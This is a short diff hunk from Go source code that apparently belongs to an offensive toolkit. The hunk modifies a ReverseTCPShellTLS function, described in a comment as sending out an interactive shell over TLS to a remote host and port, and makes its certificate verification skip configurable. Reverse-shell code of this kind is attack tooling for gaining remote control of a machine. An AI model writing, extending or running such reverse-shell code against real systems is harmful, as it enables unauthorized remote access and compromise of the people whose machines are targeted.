@@ -163,9 +163,9 @@ func ReverseUDPShell(filepath string, host string, port int) {
 * Builds on the functionality in LocalShell() to send out an interactive shell via the tls package; this one is encrypted.
 */
 
-func ReverseTCPShellTLS(filepath string, host string, port int) {
+func ReverseTCPShellTLS(filepath string, host string, port int, skip_verify bool) {
 	//set up the socket
-	conf := &tls.Config{InsecureSkipVerify: true}
+	conf := &tls.Config{InsecureSkipVerify: skip_verify}
 	target_conn,err := tls.Dial("tcp4", host + ":" + strconv.Itoa(port), conf)
 	if err != nil {
 		fmt.Println("Error connecting to", host + ":" + strconv.Itoa(port))
